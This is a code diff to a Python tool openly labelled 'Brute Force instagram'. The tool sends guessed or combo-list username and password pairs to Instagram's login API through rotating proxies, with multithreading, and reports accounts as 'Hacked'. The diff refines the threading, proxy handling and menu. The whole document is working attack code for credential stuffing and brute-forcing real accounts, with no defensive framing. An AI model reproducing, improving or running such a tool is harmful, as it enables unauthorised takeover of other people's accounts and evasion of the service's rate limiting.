@@ -1,5 +1,7 @@
+import os
 try:
 	import requests,random,threading
+	from time import sleep
 except Exception as Joker:exit(Joker)
 PRNT=threading.Lock()
 def vv1ck(*a, **b):
@@ -56,18 +58,18 @@ class randoomPas:
 		try:self.proxy =  open(self.pr,'r').read().splitlines()
 		except FileNotFoundError:
 			exit('\n[-] The file name is incorrect !\n')
-		try:self.tert = int(input('[$] Enter threading : '))
-		except ValueError:
-			exit('[!] Please enter numbers, not letters ..')
 		self.lst1 = 'm5nbvc_xzl9paqk4jhgfd7swert.yu2io'
 		self.lst2 = '!q5wKert1y@.uio2p8as_dfg3hjVklzx?cv7bnJm0@'
 		print(' ')
-		self.Trts()
+		self.random_Pass()
 	def random_Pass(self):
+		lst1 = 'm5nbvc_xzl9paqk4jhgfd7swert.yu2io'
+		lst2 = '!q5wKert1y@.uio2p8as_dfg3hjVklzx?cv7bnJm0@'
 		while True:
+			sleep(3)
 			if self.mod == '2':
-				self.user = str(''.join((random.choice(self.lst1) for i in range(4))))
-			pess = str(''.join((random.choice(self.lst2) for i in range(11))))
+				self.user = str(''.join((random.choice(lst1) for i in range(4))))
+			pess = str(''.join((random.choice(lst2) for i in range(11))))
 			proxylist = []
 			for pro in self.proxy:
 				proxylist.append(pro)
@@ -91,7 +93,7 @@ class randoomPas:
 				'_csrftoken':'missing', 
 				'login_attempt_countn':'0'}
 			try:
-				PROXY = {"https://":run,"http://":run}
+				PROXY = {"https":run,"http":run}
 				get = sent.post('https://i.instagram.com/api/v1/accounts/login/', headers=headers, data=data, proxies=PROXY, allow_redirects=True)
 				if login in get.text:
 					vv1ck(grn+f'[+] Hacked >> {self.user}:{pess}')
@@ -113,22 +115,13 @@ class randoomPas:
 				elif errorFUOt in get.text:
 					vv1ck(red+f'[-] Not hacked >> {self.user}:{pess}')
 				elif withs in get.text:
-					vv1ck(red+f'[-] Not hacked >> {self.user}:{pess}')
+					vv1ck(red+'[-] bad proxy ..')
 				elif errReq in get.text:pass
 				elif none in get.text:pass
 				else: print(get.text)
 			except requests.exceptions.ConnectionError:
 				vv1ck(red+'[-] bad proxy ..')
 			except KeyboardInterrupt:Exit()
-	def Trts(self):
-		theards =[]
-		for i in range(self.tert):
-			trts = threading.Thread(target=self.random_Pass)
-			trts.start()
-			theards.append(trts)
-		for trts2 in theards:
-			trts2.join()
-
 class ComboHck:
 	def __init__(self):
 		print('━━━━━━━━━━━━━━━Combo Hack━━━━━━━━━━━━━━')
@@ -140,9 +133,6 @@ class ComboHck:
 		try:self.proxy =  open(self.pr,'r').read().splitlines()
 		except FileNotFoundError:
 			exit('\n[-] The file name is incorrect !\n')
-		try:self.tert = int(input('[$] Enter threading : '))
-		except ValueError:
-			exit('[!] Please enter numbers, not letters ..')
 		print(' ')
 		self.Trts()
 	def Log_Combo(self):
@@ -209,13 +199,13 @@ class ComboHck:
 				except KeyboardInterrupt:Exit()
 	def Trts(self):
 		theards =[]
-		for i in range(self.tert):
+		for i in range(40):
 			trts = threading.Thread(target=self.Log_Combo)
 			trts.start()
 			theards.append(trts)
 		for trts2 in theards:
 			trts2.join()
-if __name__ == '__main__':
+def start():
 	global modeRnd
 	mode = input("""\t\t\t\t Brute Force instagram
         /\ /| https://vv1ck.github.io
@@ -229,13 +219,18 @@ if __name__ == '__main__':
 Enter Mode : """)
 	if mode == '2':
 		modeRnd = input("""
-	[1] - hack penetration + random password
-	[2] - hack random username and password """)
+[1] - hack penetration + random password
+[2] - hack random username and password 
+[3] - Go Back << : """)
 		if modeRnd == '1':randoomPas()
 		elif modeRnd =='2':randoomPas()
+		elif modeRnd == '3':
+			os.system('clear')
+			return start()
 		else:exit('Option does not exist')
 	elif mode == '1':
 		ComboHck()
 	else:
 		print("""
-	Please choose one of the numbers mentioned only [ 1 / 2 ]""")
+Please choose one of the numbers mentioned only [ 1 / 2 ]""")
+start()
